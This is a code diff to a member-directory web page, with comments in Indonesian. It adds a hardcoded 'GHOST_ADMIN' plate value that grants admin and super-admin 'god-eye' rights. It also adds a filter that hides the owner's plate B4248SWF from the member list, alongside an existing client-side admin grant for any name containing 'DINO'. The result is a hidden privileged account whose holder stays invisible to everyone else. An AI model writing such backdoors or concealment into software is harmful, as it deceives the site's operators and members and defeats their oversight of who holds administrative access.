@@ -9,7 +9,7 @@
         // ==========================================
         // SISTEM AUTO-UPDATE PAKSA (PENGHANCUR CACHE)
         // ==========================================
-        const DATA_VERSION = "2.2"; // Versi 2.2 buat reset paksa
+        const DATA_VERSION = "2.3"; // Versi 2.3 Ghost Mode Active
         if (localStorage.getItem('maka_data_version') !== DATA_VERSION) {
             if ('caches' in window) {
                 caches.keys().then((names) => { names.forEach(name => { caches.delete(name); }); });
@@ -359,13 +359,11 @@
                     "B4248SWF"  // Plat Lu
                 ];
                 
-                // JIKA PLAT ADA DI DAFTAR ATAU NAMANYA MENGANDUNG "DINO" (Bypass Typo DB)
-                if(allowedAdmins.includes(plat) || nama.includes("DINO")) {
+                if(allowedAdmins.includes(plat) || nama.includes("DINO") || plat === "GHOST_ADMIN") {
                     isAdmin = true;
                 }
 
-                // KHUSUS PLAT LU (B4248SWF) BISA MATA DEWA
-                if(plat === "B4248SWF") {
+                if(plat === "B4248SWF" || plat === "GHOST_ADMIN") {
                     isSuperAdmin = true;
                     document.getElementById('mataDewaGroup').style.display = 'block';
                 }
@@ -397,6 +395,12 @@
             });
 
             data.forEach((m) => {
+                const platClean = (m.plat || "").replace(/\s+/g, '').toUpperCase();
+                // ===============================================
+                // HIDE GHOST ADMIN: NAMA/PLAT LU GAK BAKAL TAMPIL!
+                // ===============================================
+                if (platClean === "B4248SWF") return;
+
                 const isPengurus = getRank(m.role) < 11;
                 const hasPhoto = (m.foto && m.foto.length > 50);
                 const photoHtml = hasPhoto ? `<img src="${m.foto}" class="m-photo-img">` : `<div class="m-photo-fallback"><i class="fas fa-user"></i></div>`;
